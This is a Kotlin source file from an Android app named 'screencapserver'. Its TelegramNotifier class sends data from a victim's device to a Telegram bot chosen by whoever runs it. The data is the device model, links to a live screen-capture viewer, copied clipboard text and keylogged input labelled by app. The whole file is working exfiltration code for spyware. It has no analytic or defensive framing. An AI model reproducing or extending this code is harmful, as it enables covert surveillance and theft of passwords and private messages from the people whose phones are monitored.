package com.dec.screencapserver

import android.os.Build
import android.util.Log
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject

class TelegramNotifier(
    private val botToken: String,
    private val chatId: String
) {
    private val client = OkHttpClient()
    private val device = "${Build.MANUFACTURER} ${Build.MODEL} (Android ${Build.VERSION.RELEASE})"

    fun sendUrl(url: String, deviceInfo: String = device) {
        val msg = """
            🟢 *Live Screen Active*

            📱 `$deviceInfo`
            🔗 *Viewer:* $url
            📸 *Frame:* `$url/frame`
            📊 *Status:* `$url/status`
            ⏱ *Interval:* ${Config.CAPTURE_INTERVAL_MS}ms
        """.trimIndent()
        send(msg)
    }

    fun sendClip(text: String) {
        if (text.length < 2) return
        val preview = text.take(800)
        val msg = "📋 *Clipboard*\n```\n$preview\n```"
        send(msg)
    }

    fun sendKeylog(pkg: String, text: String) {
        if (text.length < 3) return
        val appName = pkg.split(".").lastOrNull() ?: pkg
        val msg = "⌨️ *[$appName]*\n`${text.take(400)}`"
        send(msg)
    }

    private fun send(text: String) {
        if (botToken == "YOUR_BOT_TOKEN_HERE") {
            Log.w("Telegram", "Bot token not set!")
            return
        }
        val body = JSONObject().apply {
            put("chat_id", chatId)
            put("text", text)
            put("parse_mode", "Markdown")
            put("disable_web_page_preview", true)
        }.toString()

        val req = Request.Builder()
            .url("https://api.telegram.org/bot$botToken/sendMessage")
            .post(body.toRequestBody("application/json".toMediaType()))
            .build()

        client.newCall(req).enqueue(object : Callback {
            override fun onFailure(call: Call, e: java.io.IOException) {
                Log.e("Telegram", "fail: ${e.message}")
            }
            override fun onResponse(call: Call, response: Response) {
                response.close()
            }
        })
    }
}
